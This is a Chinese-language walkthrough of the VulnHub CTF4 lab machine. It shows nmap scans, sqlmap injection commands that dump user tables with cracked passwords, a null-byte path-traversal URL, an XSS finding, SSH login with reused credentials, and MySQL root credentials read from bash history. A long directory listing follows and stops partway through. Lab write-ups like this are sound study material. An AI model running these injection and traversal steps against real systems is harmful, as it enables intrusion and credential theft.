#vulnhub CTF4靶机渗透

## 1、快速扫描

先用nmap -sS 192.168.2.1/24
扫描出可疑主机:192.168.2.104


Nmap scan report for localhost (192.168.2.104)
Host is up (0.024s latency).
Not shown: 996 filtered ports
PORT    STATE  SERVICE
22/tcp  open   ssh
25/tcp  open   smtp
80/tcp  open   http
631/tcp closed ipp
MAC Address: 30:24:32:FF:91:7D (Unknown)

## 2.主动扫描
```
nmap -A -T4 192.168.2.104
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-03 11:16 CST
Warning: 192.168.2.104 giving up on port because retransmission cap hit (6).
Nmap scan report for localhost (192.168.2.104)
Host is up (0.65s latency).
Not shown: 888 closed ports, 109 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey:
|   1024 10:4a:18:f8:97:e0:72:27:b5:a4:33:93:3d:aa:9d:ef (DSA)
|_  2048 e7:70:d3:81:00:41:b8:6e:fd:31:ae:0e:00:ea:5c:b4 (RSA)
25/tcp open  smtp    Sendmail 8.13.5/8.13.5
| smtp-commands: ctf4.sas.upenn.edu Hello localhost [192.168.2.101] (may be forged), pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP,
|_ 2.0.0 This is sendmail version 8.13.5 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
80/tcp open  http    Apache httpd 2.2.0 ((Fedora))
| http-robots.txt: 5 disallowed entries
|_/mail/ /restricted/ /conf/ /sql/ /admin/
|_http-server-header: Apache/2.2.0 (Fedora)
|_http-title:  Prof. Ehks
Service Info: Host: ctf4.sas.upenn.edu; OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 992.87 seconds
```

```
nmap --script=vuln 192.168.2.104
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-03 11:40 CST
Pre-scan script results:
| broadcast-avahi-dos:
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for localhost (192.168.2.104)
Host is up (0.017s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp
| smtp-vuln-cve2010-4344:
|_  The SMTP server is not Exim: NOT VULNERABLE
|_sslv2-drown:
80/tcp open  http
| http-csrf:
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=localhost
|   Found the following possible CSRF vulnerabilities:
|
|     Path: http://localhost:80/
|     Form id:
|_    Form action: /index.html?page=search&title=Search Results
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum:
|   /admin/: Possible admin folder
|   /admin/index.php: Possible admin folder
|   /admin/login.php: Possible admin folder
|   /admin/admin.php: Possible admin folder
|   /robots.txt: Robots file
|   /icons/: Potentially interesting directory w/ listing on 'apache/2.2.0 (fedora)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.2.0 (fedora)'
|   /inc/: Potentially interesting directory w/ listing on 'apache/2.2.0 (fedora)'
|   /pages/: Potentially interesting directory w/ listing on 'apache/2.2.0 (fedora)'
|   /restricted/: Potentially interesting folder (401 Authorization Required)
|   /sql/: Potentially interesting directory w/ listing on 'apache/2.2.0 (fedora)'
|_  /usage/: Potentially interesting folder
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-trace: TRACE is enabled

Nmap done: 1 IP address (1 host up) scanned in 1212.67 seconds
```

## 3、信息收集

访问robots.txt

```
User-agent: *
Disallow: /mail/
Disallow: /restricted/
Disallow: /conf/
Disallow: /sql/
Disallow: /admin/
```
(1）访问sql文件夹得到sql文件:
```
use ehks;
create table user (
    user_id int not null auto_increment primary key, 
    user_name varchar(20) not null, 
    user_pass varchar(32) not null
);
create table blog (
    blog_id int primary key not null auto_increment, 
    blog_title varchar(255), 
    blog_body text, 
    blog_date datetime not null
);
create table comment (
    comment_id int not null auto_increment primary key,
    comment_title varchar (50), 
    comment_body text,
    comment_author varchar(50),
    comment_url varchar(50),
    comment_date datetime not null
);
```

(2)访问conf得到：
```
Please contact the server administrator, dstevens@localhost and inform them of the time the error occurred, and anything you might have done that may have caused the error.
```
证明管理员是dstevens

(3)访问admin得到后台地址：
/admin/

(4)访问restricted发现需要账号密码
(5)访问mail发现是个邮箱系统也需要账户名和密码，
还知道邮件版本是SquirrelMail version 1.4.17

(6)访问主页，发现是个博客系统
有两个用户 jdurbin,sorzek
url:
/index.html?page=blog&title=Blog&id=2
/index.html?page=search&title=Search%20Results
/index.html?title=Home%20Page
/index.html?page=contact&title=Contact



## 4.尝试攻击

### 4.1 sql注入

url /index.html?page=blog&title=Blog&id={id}尝试sql注入

2' 报错
2'%23 一样报错
2 and 1 正确   #数字型注入

用sqlmap注入：
sqlmap -u http://192.168.2.104/index.html\?page\=blog\&title\=Blog\&id\=2 
sqlmap -u http://192.168.2.104/index.html\?page\=blog\&title\=Blog\&id\=2 --tables
表：

```
Database: calendar
+---------------------------------------+
| phpc_calendars                        |
| phpc_events                           |
| phpc_sequence                         |
| phpc_users                            |
| uid                                   |
+---------------------------------------+

Database: roundcubemail
[6 tables]
+---------------------------------------+
| session                               |
| cache                                 |
| contacts                              |
| identities                            |
| messages                              |
| users                                 |
+---------------------------------------+

Database: ehks
[3 tables]
+---------------------------------------+
| user                                  |
| blog                                  |
| comment                               |
+---------------------------------------+

Database: information_schema
[16 tables]
+---------------------------------------+
| CHARACTER_SETS                        |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMNS                               |
| COLUMN_PRIVILEGES                     |
| KEY_COLUMN_USAGE                      |
| ROUTINES                              |
| SCHEMATA                              |
| SCHEMA_PRIVILEGES                     |
| STATISTICS                            |
| TABLES                                |
| TABLE_CONSTRAINTS                     |
| TABLE_PRIVILEGES                      |
| TRIGGERS                              |
| USER_PRIVILEGES                       |
| VIEWS                                 |
+---------------------------------------+

Database: mysql
[17 tables]
+---------------------------------------+
| user                                  |
| columns_priv                          |
| db                                    |
| func                                  |
| help_category                         |
| help_keyword                          |
| help_relation                         |
| help_topic                            |
| host                                  |
| proc                                  |
| procs_priv                            |
| tables_priv                           |
| time_zone                             |
| time_zone_leap_second                 |
| time_zone_name                        |
| time_zone_transition                  |
| time_zone_transition_type             |
+---------------------------------------+
```

先看ehks数据库有什么东西

sqlmap -u http://192.168.2.104/index.html\?page\=blog\&title\=Blog\&id\=2 -D ehks -T user --column

sqlmap -u http://192.168.2.104/index.html\?page\=blog\&title\=Blog\&id\=2 -D ehks -T user -C user_name,user_pass --dump
得到密码：

```
+-----------+--------------------------------------------------+
| user_name | user_pass                                        |
+-----------+--------------------------------------------------+
| dstevens  | 02e823a15a392b5aa4ff4ccb9060fa68 (ilike2surf)    |
| achen     | b46265f1e7faa3beab09db5c28739380 (seventysixers) |
| pmoore    | 8f4743c04ed8e5f39166a81f26319bb5 (Homesite)      |
| jdurbin   | 7c7bc9f465d86b8164686ebb5151a717 (Sue1978)       |
| sorzek    | 64d1f88b9b276aece4b0edcc25b7a434 (pacman)        |
| ghighland | 9f3eb3087298ff21843cc4e013cf355f (undone1)       |
+-----------+--------------------------------------------------+
```

roundcubemail库下发现是空的

calendar库下phpcuser表：
```
+-----+-----------+----------+--------------------------------------------------+
| uid | username  | calendar | password                                         |
+-----+-----------+----------+--------------------------------------------------+
| 0   | anonymous | 0        | <blank>                                          |
| 1   | admin     | 0        | a0e7b2a565119c0a7ec3126a16016113 (calendar)      |
| 2   | dstevens  | 0        | 02e823a15a392b5aa4ff4ccb9060fa68 (ilike2surf)    |
| 3   | achen     | 0        | b46265f1e7faa3beab09db5c28739380 (seventysixers) |
| 4   | pmoore    | 0        | 8f4743c04ed8e5f39166a81f26319bb5 (Homesite)      |
| 5   | jdurbin   | 0        | 7c7bc9f465d86b8164686ebb5151a717 (Sue1978)       |
+-----+-----------+----------+--------------------------------------------------+
```



### 4.2.LFI和目录穿越

测试下有没有LFI,

发现page字段测试php伪协议时不能成功，但存在目录穿越问题。在nmap扫描时已经发现敏感目录/pages/

发现下面的三个文件正好对应主页标签的文件。

通过：

http://192.168.2.104/index.html?page=../admin/login&title=Contact

可以访问login.php页面。目录穿越问题存在。可以遍历任意php文件。那么可不可以访问任意文件呢？由信息收集阶段知道web中间件为Apache httpd 2.2.0，想下apache的解析漏洞好像没什么用。php有一个截断漏洞可以利用php截断漏洞尝试

```
http://192.168.2.104/index.html?page=../index.html%00&title=Research
```

测试成功。存在截断漏洞(有没有什么测试php版本好的工具？)。

任意文件遍历成功.





### 4.3.XSS

而且测试title时发现有问题

title中的字符会显示在html中head里的title标签，这样只要闭合titel标签就可以实现xss攻击

由于管理员是dstevens，所以直接以管理员登录看下

登录成功
发现有个可以发blog的链接。
测试了下，发现有xss漏洞。

### 4.4.SSH

由于在phpcuser和user表都发现账户jdurbin，尝试ssh登录,成功登陆

登录后发现网站目录如下：

```
.
|-- html -> /var/www/html
`-- mail
    |-- INBOX.Drafts
    |-- INBOX.Sent
    |-- INBOX.Trash
    `-- inbox
    
    
```

/var/www/html见附录一

同时可以发现其他用户也可以登录



 ### 4.5.信息发现

现在相当于拿下shell了，看下更多信息发现

cat ~/.bash_history

发现几条有趣的命令

```
mysql -u root -pdatabase
mysql -u roundcube -ppassword roundcubemail < SQL/mysql.initial.sql
```

mysql账户root的密码为database

mysql账户roundcube的密码为password

```
cd /var/www/html
mkdir restricted
cd restricted
vi .htaccess
cat .htpasswd
vi instructions.txt
```

发现.htpasswd下也存储了账号密码

cd到/var/www/html目录，然后ls

```
[dstevens@ctf4 html]$ ls -al
total 316
drwxrwsr-x 11 jdurbin users   4096 May  3 02:31 .
drwxr-xr-x  7 root    root    4096 Mar  6  2009 ..
drwxrwsr-x  3 jdurbin users   4096 Mar  9  2009 admin
-rwxrwxr-x  1 jdurbin users 189881 May  3 02:31 b374k1.php
drwxrwsr-x  5 pmoore  users   4096 May  3 07:42 calendar
drwxrwxr-x  2 jdurbin users   4096 Mar  9  2009 conf
-rw-rw-r--  1 jdurbin users     56 Mar  9  2009 .htaccess
drwxrwsr-x  2 jdurbin users   4096 Mar  9  2009 images
drwxrwxr-x  2 jdurbin users   4096 Mar  9  2009 inc
-rw-rw-r--  1 jdurbin users   2862 Mar 10  2009 index.html
-rw-rw-r--  1 pmoore  users   2863 Mar 10  2009 index.html.bak
drwxrwsr-x 16 jdurbin users   4096 Mar  9  2009 mail
drwxrwxr-x  2 jdurbin users   4096 Mar  9  2009 pages
drwxrwsr-x  2 jdurbin users   4096 May  3 07:35 restricted
-rw-rw-r--  1 jdurbin users    104 Mar  9  2009 robots.txt
drwxrwxr-x  2 jdurbin users   4096 Mar  9  2009 sql
```

可以发现各个应用对应的管理员

再cat /etc/group，发现已知的所有用户都不属于root组，考虑提权。

### 4.6.提权

查看linux版本：

```
cat /proc/version
Linux version 2.6.15-1.2054_FC5 (bhcompile@hs20-bc1-3.build.redhat.com) (gcc version 4.1.0 20060304 (Red Hat 4.1.0-3)) #1 Tue Mar 14 15:48:33 EST 2006
```

系统是2.6.15的redhat系统

发现比较老了，

尝试以下提权均不成功

CVE-2010-3081

CVE-2008-4210

CVE-2010-4347



以后再提权吧

# 附录

## 附录一 html

```
/var/www/html
|-- admin
|   |-- admin.php
|   |-- inc
|   |   `-- blog.php
|   |-- index.php
|   `-- login.php
|-- calendar
|   |-- AUTHORS
|   |-- COPYING
|   |-- INSTALL
|   |-- NEWS
|   |-- README
|   |-- TODO
|   |-- adodb
|   |   |-- adodb-active-record.inc.php
|   |   |-- adodb-csvlib.inc.php
|   |   |-- adodb-datadict.inc.php
|   |   |-- adodb-error.inc.php
|   |   |-- adodb-errorhandler.inc.php
|   |   |-- adodb-errorpear.inc.php
|   |   |-- adodb-exceptions.inc.php
|   |   |-- adodb-iterator.inc.php
|   |   |-- adodb-lib.inc.php
|   |   |-- adodb-memcache.lib.inc.php
|   |   |-- adodb-pager.inc.php
|   |   |-- adodb-pear.inc.php
|   |   |-- adodb-perf.inc.php
|   |   |-- adodb-php4.inc.php
|   |   |-- adodb-time.inc.php
|   |   |-- adodb-time.zip
|   |   |-- adodb-xmlschema.inc.php
|   |   |-- adodb-xmlschema03.inc.php
|   |   |-- adodb.inc.php
|   |   |-- contrib
|   |   |   `-- toxmlrpc.inc.php
|   |   |-- cute_icons_for_site
|   |   |   |-- Thumbs.db
|   |   |   |-- adodb.gif
|   |   |   `-- adodb2.gif
|   |   |-- datadict
|   |   |   |-- datadict-access.inc.php
|   |   |   |-- datadict-db2.inc.php
|   |   |   |-- datadict-firebird.inc.php
|   |   |   |-- datadict-generic.inc.php
|   |   |   |-- datadict-ibase.inc.php
|   |   |   |-- datadict-informix.inc.php
|   |   |   |-- datadict-mssql.inc.php
|   |   |   |-- datadict-mssqlnative.inc.php
|   |   |   |-- datadict-mysql.inc.php
|   |   |   |-- datadict-oci8.inc.php
|   |   |   |-- datadict-postgres.inc.php
|   |   |   |-- datadict-sapdb.inc.php
|   |   |   `-- datadict-sybase.inc.php
|   |   |-- docs
|   |   |   |-- docs-active-record.htm
|   |   |   |-- docs-adodb.htm
|   |   |   |-- docs-datadict.htm
|   |   |   |-- docs-oracle.htm
|   |   |   |-- docs-perf.htm
|   |   |   |-- docs-session.htm
|   |   |   |-- docs-session.old.htm
|   |   |   |-- old-changelog.htm
|   |   |   |-- readme.htm
|   |   |   |-- tips_portable_sql.htm
|   |   |   `-- tute.htm
|   |   |-- drivers
|   |   |   |-- adodb-access.inc.php
|   |   |   |-- adodb-ado.inc.php
|   |   |   |-- adodb-ado5.inc.php
|   |   |   |-- adodb-ado_access.inc.php
|   |   |   |-- adodb-ado_mssql.inc.php
|   |   |   |-- adodb-borland_ibase.inc.php
|   |   |   |-- adodb-csv.inc.php
|   |   |   |-- adodb-db2.inc.php
|   |   |   |-- adodb-fbsql.inc.php
|   |   |   |-- adodb-firebird.inc.php
|   |   |   |-- adodb-ibase.inc.php
|   |   |   |-- adodb-informix.inc.php
|   |   |   |-- adodb-informix72.inc.php
|   |   |   |-- adodb-ldap.inc.php
|   |   |   |-- adodb-mssql.inc.php
|   |   |   |-- adodb-mssql.inc.php.bak
|   |   |   |-- adodb-mssql_n.inc.php
|   |   |   |-- adodb-mssqlnative.inc.php
|   |   |   |-- adodb-mssqlpo.inc.php
|   |   |   |-- adodb-mysql.inc.php
|   |   |   |-- adodb-mysqli.inc.php
|   |   |   |-- adodb-mysqlt.inc.php
|   |   |   |-- adodb-netezza.inc.php
|   |   |   |-- adodb-oci8.inc.php
|   |   |   |-- adodb-oci805.inc.php
|   |   |   |-- adodb-oci8po.inc.php
|   |   |   |-- adodb-odbc.inc.php
|   |   |   |-- adodb-odbc_db2.inc.php
|   |   |   |-- adodb-odbc_mssql.inc.php
|   |   |   |-- adodb-odbc_oracle.inc.php
|   |   |   |-- adodb-odbtp.inc.php
|   |   |   |-- adodb-odbtp_unicode.inc.php
|   |   |   |-- adodb-oracle.inc.php
|   |   |   |-- adodb-pdo.inc.php
|   |   |   |-- adodb-pdo_mssql.inc.php
|   |   |   |-- adodb-pdo_mysql.inc.php
|   |   |   |-- adodb-pdo_oci.inc.php
|   |   |   |-- adodb-pdo_pgsql.inc.php
|   |   |   |-- adodb-postgres.inc.php
|   |   |   |-- adodb-postgres64.inc.php
|   |   |   |-- adodb-postgres7.inc.php
|   |   |   |-- adodb-postgres8.inc.php
|   |   |   |-- adodb-proxy.inc.php
|   |   |   |-- adodb-sapdb.inc.php
|   |   |   |-- adodb-sqlanywhere.inc.php
|   |   |   |-- adodb-sqlite.inc.php
|   |   |   |-- adodb-sqlitepo.inc.php
|   |   |   |-- adodb-sybase.inc.php
|   |   |   |-- adodb-sybase_ase.inc.php
|   |   |   `-- adodb-vfp.inc.php
|   |   |-- lang
|   |   |   |-- adodb-ar.inc.php
|   |   |   |-- adodb-bg.inc.php
|   |   |   |-- adodb-bgutf8.inc.php
|   |   |   |-- adodb-ca.inc.php
|   |   |   |-- adodb-cn.inc.php
|   |   |   |-- adodb-cz.inc.php
|   |   |   |-- adodb-da.inc.php
|   |   |   |-- adodb-de.inc.php
|   |   |   |-- adodb-en.inc.php
|   |   |   |-- adodb-es.inc.php
|   |   |   |-- adodb-esperanto.inc.php
|   |   |   |-- adodb-fa.inc.php
|   |   |   |-- adodb-fr.inc.php
|   |   |   |-- adodb-hu.inc.php
|   |   |   |-- adodb-it.inc.php
|   |   |   |-- adodb-nl.inc.php
|   |   |   |-- adodb-pl.inc.php
|   |   |   |-- adodb-pt-br.inc.php
|   |   |   |-- adodb-ro.inc.php
|   |   |   |-- adodb-ru1251.inc.php
|   |   |   |-- adodb-sv.inc.php
|   |   |   |-- adodb-uk1251.inc.php
|   |   |   `-- adodb_th.inc.php
|   |   |-- license.txt
|   |   |-- pear
|   |   |   |-- Auth
|   |   |   |   `-- Container
|   |   |   |       `-- ADOdb.php
|   |   |   `-- readme.Auth.txt
|   |   |-- perf
|   |   |   |-- perf-db2.inc.php
|   |   |   |-- perf-informix.inc.php
|   |   |   |-- perf-mssql.inc.php
|   |   |   |-- perf-mssqlnative.inc.php
|   |   |   |-- perf-mysql.inc.php
|   |   |   |-- perf-oci8.inc.php
|   |   |   `-- perf-postgres.inc.php
|   |   |-- pivottable.inc.php
|   |   |-- readme.txt
|   |   |-- rsfilter.inc.php
|   |   |-- server.php
|   |   |-- session
|   |   |   |-- adodb-compress-bzip2.php
|   |   |   |-- adodb-compress-gzip.php
|   |   |   |-- adodb-cryptsession.php
|   |   |   |-- adodb-cryptsession2.php
|   |   |   |-- adodb-encrypt-mcrypt.php
|   |   |   |-- adodb-encrypt-md5.php
|   |   |   |-- adodb-encrypt-secret.php
|   |   |   |-- adodb-encrypt-sha1.php
|   |   |   |-- adodb-sess.txt
|   |   |   |-- adodb-session-clob.php
|   |   |   |-- adodb-session-clob2.php
|   |   |   |-- adodb-session.php
|   |   |   |-- adodb-session2.php
|   |   |   |-- adodb-sessions.mysql.sql
|   |   |   |-- adodb-sessions.oracle.clob.sql
|   |   |   |-- adodb-sessions.oracle.sql
|   |   |   |-- crypt.inc.php
|   |   |   |-- old
|   |   |   |   |-- adodb-cryptsession.php
|   |   |   |   |-- adodb-session-clob.php
|   |   |   |   |-- adodb-session.php
|   |   |   |   `-- crypt.inc.php
|   |   |   |-- session_schema.xml
|   |   |   `-- session_schema2.xml
|   |   |-- tests
|   |   |   |-- benchmark.php
|   |   |   |-- client.php
|   |   |   |-- pdo.php
|   |   |   |-- test-active-record.php
|   |   |   |-- test-active-recs2.php
|   |   |   |-- test-datadict.php
|   |   |   |-- test-perf.php
|   |   |   |-- test-pgblob.php
|   |   |   |-- test-php5.php
|   |   |   |-- test-xmlschema.php
|   |   |   |-- test.php
|   |   |   |-- test2.php
|   |   |   |-- test3.php
|   |   |   |-- test4.php
|   |   |   |-- test5.php
|   |   |   |-- test_rs_array.php
|   |   |   |-- testcache.php
|   |   |   |-- testdatabases.inc.php
|   |   |   |-- testgenid.php
|   |   |   |-- testmssql.php
|   |   |   |-- testoci8.php
|   |   |   |-- testoci8cursor.php
|   |   |   |-- testpaging.php
|   |   |   |-- testpear.php
|   |   |   |-- testsessions.php
|   |   |   |-- time.php
|   |   |   |-- tmssql.php
|   |   |   |-- xmlschema-mssql.xml
|   |   |   `-- xmlschema.xml
|   |   |-- toexport.inc.php
|   |   |-- tohtml.inc.php
|   |   |-- xmlschema.dtd
|   |   |-- xmlschema03.dtd
|   |   `-- xsl
|   |       |-- convert-0.1-0.2.xsl
|   |       |-- convert-0.1-0.3.xsl
|   |       |-- convert-0.2-0.1.xsl
|   |       |-- convert-0.2-0.3.xsl
|   |       |-- remove-0.2.xsl
|   |       `-- remove-0.3.xsl
|   |-- config.php
|   |-- includes
|   |   |-- admin.php
|   |   |-- calendar.php
|   |   |-- db.php
|   |   |-- display.php
|   |   |-- event_delete.php
|   |   |-- event_form.php
|   |   |-- event_submit.php
|   |   |-- html.php
|   |   |-- index.html
|   |   |-- login.php
|   |   |-- logout.php
|   |   |-- new_user_submit.php
|   |   |-- options_submit.php
|   |   |-- search.php
|   |   |-- setup.php
|   |   `-- style.php
|   |-- index.php
|   |-- install.php
|   |-- locale
|   |   |-- de
|   |   |   |-- LC_MESSAGES
|   |   |   |   |-- index.html
|   |   |   |   `-- messages.po
|   |   |   `-- index.html
|   |   |-- de_DE -> de
|   |   `-- index.html
|   |-- messages.po
|   `-- php-calendar-0.10.tar.gz
|-- conf
|   `-- config.ini
|-- images
|   `-- system-lock-screen.png
|-- inc
|   |-- footer.php
|   `-- header.php
|-- index.html
|-- index.html.bak
|-- mail
|   |-- AUTHORS
|   |-- COPYING
|   |-- ChangeLog
|   |-- INSTALL
|   |-- README
|   |-- ReleaseNotes
|   |-- UPGRADE
|   |-- class
|   |   |-- deliver
|   |   |   |-- Deliver.class.php
|   |   |   |-- Deliver_IMAP.class.php
|   |   |   |-- Deliver_SMTP.class.php
|   |   |   |-- Deliver_SendMail.class.php
|   |   |   `-- index.php
|   |   |-- helper
|   |   |   |-- VCard.class.php
|   |   |   `-- index.php
|   |   |-- html.class.php
|   |   |-- index.php
|   |   |-- mime
|   |   |   |-- AddressStructure.class.php
|   |   |   |-- ContentType.class.php
|   |   |   |-- Disposition.class.php
|   |   |   |-- Language.class.php
|   |   |   |-- Message.class.php
|   |   |   |-- MessageHeader.class.php
|   |   |   |-- Rfc822Header.class.php
|   |   |   |-- SMimeMessage.class.php
|   |   |   `-- index.php
|   |   `-- mime.class.php
|   |-- config
|   |   |-- conf.pl
|   |   |-- config.php
|   |   |-- config_default.php
|   |   |-- config_local.php
|   |   `-- index.php
|   |-- configure
|   |-- contrib
|   |   |-- RPM
|   |   |   |-- config.php.redhat
|   |   |   |-- squirrelmail.conf
|   |   |   |-- squirrelmail.cron
|   |   |   `-- squirrelmail.spec
|   |   |-- conf.pl.8
|   |   |-- decrypt_headers.php
|   |   |-- squirrelmail.mailto.NT2KXP.reg
|   |   `-- squirrelmail.mailto.Win9x.reg
|   |-- data
|   |   |-- default_pref
|   |   `-- index.php
|   |-- doc
|   |   |-- ReleaseNotes
|   |   |   |-- 1.2
|   |   |   |   |-- Notes-1.2.0.txt
|   |   |   |   |-- Notes-1.2.1.txt
|   |   |   |   |-- Notes-1.2.2.txt
|   |   |   |   |-- Notes-1.2.3.txt
|   |   |   |   |-- Notes-1.2.4.txt
|   |   |   |   |-- Notes-1.2.5.txt
|   |   |   |   `-- Notes-1.2.6.txt
|   |   |   |-- 1.3
|   |   |   |   |-- Notes-1.3.0.txt
|   |   |   |   |-- Notes-1.3.1.txt
|   |   |   |   `-- Notes-1.3.2.txt
|   |   |   `-- 1.4
|   |   |       |-- Notes-1.4.0.txt
|   |   |       |-- Notes-1.4.1.txt
|   |   |       |-- Notes-1.4.10.txt
|   |   |       |-- Notes-1.4.10a.txt
|   |   |       |-- Notes-1.4.11.txt
|   |   |       |-- Notes-1.4.12.txt
|   |   |       |-- Notes-1.4.13.txt
|   |   |       |-- Notes-1.4.15.txt
|   |   |       |-- Notes-1.4.16.txt
|   |   |       |-- Notes-1.4.2.txt
|   |   |       |-- Notes-1.4.3.txt
|   |   |       |-- Notes-1.4.3a.txt
|   |   |       |-- Notes-1.4.4.txt
|   |   |       |-- Notes-1.4.5.txt
|   |   |       |-- Notes-1.4.6.txt
|   |   |       |-- Notes-1.4.7.txt
|   |   |       |-- Notes-1.4.8.txt
|   |   |       |-- Notes-1.4.9.txt
|   |   |       `-- Notes-1.4.9a.txt
|   |   |-- authentication.txt
|   |   |-- ie_ssl.txt
|   |   |-- index.html
|   |   |-- presets.txt
|   |   |-- russian_apache.txt
|   |   |-- security.txt
|   |   |-- translating.txt
|   |   `-- translating_help.txt
|   |-- functions
|   |   |-- abook_database.php
|   |   |-- abook_ldap_server.php
|   |   |-- abook_local_file.php
|   |   |-- addressbook.php
|   |   |-- attachment_common.php
|   |   |-- auth.php
|   |   |-- constants.php
|   |   |-- date.php
|   |   |-- db_prefs.php
|   |   |-- decode
|   |   |   |-- cp1250.php
|   |   |   |-- cp1251.php
|   |   |   |-- cp1252.php
|   |   |   |-- cp1253.php
|   |   |   |-- cp1254.php
|   |   |   |-- cp1255.php
|   |   |   |-- cp1256.php
|   |   |   |-- cp1257.php
|   |   |   |-- cp1258.php
|   |   |   |-- cp855.php
|   |   |   |-- cp866.php
|   |   |   |-- index.php
|   |   |   |-- iso_8859_1.php
|   |   |   |-- iso_8859_10.php
|   |   |   |-- iso_8859_11.php
|   |   |   |-- iso_8859_13.php
|   |   |   |-- iso_8859_14.php
|   |   |   |-- iso_8859_15.php
|   |   |   |-- iso_8859_16.php
|   |   |   |-- iso_8859_2.php
|   |   |   |-- iso_8859_3.php
|   |   |   |-- iso_8859_4.php
|   |   |   |-- iso_8859_5.php
|   |   |   |-- iso_8859_6.php
|   |   |   |-- iso_8859_7.php
|   |   |   |-- iso_8859_8.php
|   |   |   |-- iso_8859_9.php
|   |   |   |-- iso_ir_111.php
|   |   |   |-- koi8_r.php
|   |   |   |-- koi8_u.php
|   |   |   |-- ns_4551_1.php
|   |   |   |-- tis_620.php
|   |   |   |-- us_ascii.php
|   |   |   `-- utf_8.php
|   |   |-- display_messages.php
|   |   |-- encode
|   |   |   |-- cp1251.php
|   |   |   |-- cp1255.php
|   |   |   |-- cp1256.php
|   |   |   |-- index.php
|   |   |   |-- iso_8859_1.php
|   |   |   |-- iso_8859_15.php
|   |   |   |-- iso_8859_2.php
|   |   |   |-- iso_8859_7.php
|   |   |   |-- iso_8859_9.php
|   |   |   |-- koi8_r.php
|   |   |   |-- koi8_u.php
|   |   |   |-- tis_620.php
|   |   |   |-- us_ascii.php
|   |   |   `-- utf_8.php
|   |   |-- file_prefs.php
|   |   |-- forms.php
|   |   |-- gettext.php
|   |   |-- global.php
|   |   |-- html.php
|   |   |-- i18n.php
|   |   |-- identity.php
|   |   |-- imap.php
|   |   |-- imap_general.php
|   |   |-- imap_mailbox.php
|   |   |-- imap_messages.php
|   |   |-- imap_search.php
|   |   |-- imap_utf7_local.php
|   |   |-- index.php
|   |   |-- mailbox_display.php
|   |   |-- mime.php
|   |   |-- options.php
|   |   |-- page_header.php
|   |   |-- plugin.php
|   |   |-- prefs.php
|   |   |-- strings.php
|   |   |-- tree.php
|   |   `-- url_parser.php
|   |-- help
|   |   |-- en_US
|   |   |   |-- FAQ.hlp
|   |   |   |-- addresses.hlp
|   |   |   |-- basic.hlp
|   |   |   |-- compose.hlp
|   |   |   |-- folders.hlp
|   |   |   |-- main_folder.hlp
|   |   |   |-- options.hlp
|   |   |   |-- read_mail.hlp
|   |   |   `-- search.hlp
|   |   `-- index.php
|   |-- images
|   |   |-- blank.png
|   |   |-- delitem.png
|   |   |-- down_pointer.png
|   |   |-- draft.png
|   |   |-- folder.png
|   |   |-- inbox.png
|   |   |-- index.php
|   |   |-- minus.png
|   |   |-- plus.png
|   |   |-- sec_remove_eng.png
|   |   |-- senti.png
|   |   |-- sm_logo.png
|   |   |-- sort_none.png
|   |   `-- up_pointer.png
|   |-- include
|   |   |-- index.php
|   |   |-- load_prefs.php
|   |   |-- options
|   |   |   |-- display.php
|   |   |   |-- folder.php
|   |   |   |-- index.php
|   |   |   `-- personal.php
|   |   `-- validate.php
|   |-- index.php
|   |-- locale
|   |   |-- README.locales
|   |   |-- index.php
|   |   `-- timezones.cfg
|   |-- plugins
|   |   |-- README.plugins
|   |   |-- administrator
|   |   |   |-- INSTALL
|   |   |   |-- auth.php
|   |   |   |-- defines.php
|   |   |   |-- index.php
|   |   |   |-- options.php
|   |   |   `-- setup.php
|   |   |-- bug_report
|   |   |   |-- README
|   |   |   |-- bug_report.php
|   |   |   |-- functions.php
|   |   |   |-- index.php
|   |   |   `-- setup.php
|   |   |-- calendar
|   |   |   |-- README
|   |   |   |-- calendar.php
|   |   |   |-- calendar_data.php
|   |   |   |-- day.php
|   |   |   |-- event_create.php
|   |   |   |-- event_delete.php
|   |   |   |-- event_edit.php
|   |   |   |-- functions.php
|   |   |   |-- index.php
|   |   |   `-- setup.php
|   |   |-- delete_move_next
|   |   |   |-- README
|   |   |   |-- index.php
|   |   |   `-- setup.php
|   |   |-- demo
|   |   |   |-- COPYING
|   |   |   |-- INSTALL
|   |   |   |-- README
|   |   |   |-- demo.php
|   |   |   |-- demo.pot
|   |   |   |-- functions.php
|   |   |   |-- getpot
|   |   |   |-- index.php
|   |   |   `-- setup.php
|   |   |-- filters
|   |   |   |-- README
|   |   |   |-- bulkquery
|   |   |   |   |-- INSTALL
|   |   |   |   |-- Makefile
|   |   |   |   |-- README
|   |   |   |   |-- bq.in
|   |   |   |   |-- bq.out
|   |   |   |   |-- bulkquery.c
|   |   |   |   `-- index.php
|   |   |   |-- filters.php
|   |   |   |-- index.php
|   |   |   |-- options.php
|   |   |   |-- setup.php
|   |   |   `-- spamoptions.php
|   |   |-- fortune
|   |   |   |-- README
|   |   |   |-- fortune_functions.php
|   |   |   |-- index.php
|   |   |   `-- setup.php
|   |   |-- index.php
|   |   |-- info
|   |   |   |-- README
|   |   |   |-- functions.php
|   |   |   |-- index.php
|   |   |   |-- options.php
|   |   |   `-- setup.php
|   |   |-- listcommands
|   |   |   |-- README
|   |   |   |-- index.php
|   |   |   |-- mailout.php
